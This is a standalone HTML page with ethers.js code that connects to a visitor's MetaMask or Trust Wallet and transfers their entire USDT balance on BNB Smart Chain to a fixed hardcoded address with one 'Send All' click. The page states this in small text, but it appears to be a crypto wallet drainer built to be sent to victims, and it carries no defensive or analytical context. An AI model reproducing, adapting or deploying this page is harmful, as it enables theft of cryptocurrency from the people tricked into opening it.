<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Send USDT (BEP-20)</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: #1e1e1e;
      padding: 2em;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
      max-width: 400px;
    }
    button {
      background-color: #00cc99;
      color: white;
      padding: 1em 2em;
      border: none;
      border-radius: 8px;
      font-size: 1.1em;
      cursor: pointer;
      margin-top: 1em;
    }
    button:disabled {
      background-color: #666;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Send All USDT (BEP-20)</h2>
    <p>This will send your entire USDT balance on BSC to:</p>
    <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
    <button id="sendBtn">Send All</button>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
    const usdtAbi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function transfer(address to, uint256 value) returns (bool)"
    ];

    async function sendAllUSDT() {
      if (!window.ethereum) {
        alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
        return;
      }

      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);

        const balance = await usdt.balanceOf(userAddress);

        if (balance.isZero()) {
          alert("Your USDT balance is 0.");
          return;
        }

        const tx = await usdt.transfer(recipient, balance);
        alert("Transaction sent! Waiting for confirmation...");
        await tx.wait();
        alert("Transaction confirmed. USDT sent successfully.");
      } catch (err) {
        console.error(err);
        alert("Transaction failed or was cancelled.");
      }
    }

    document.getElementById("sendBtn").onclick = sendAllUSDT;
  </script>
</body>
</html>
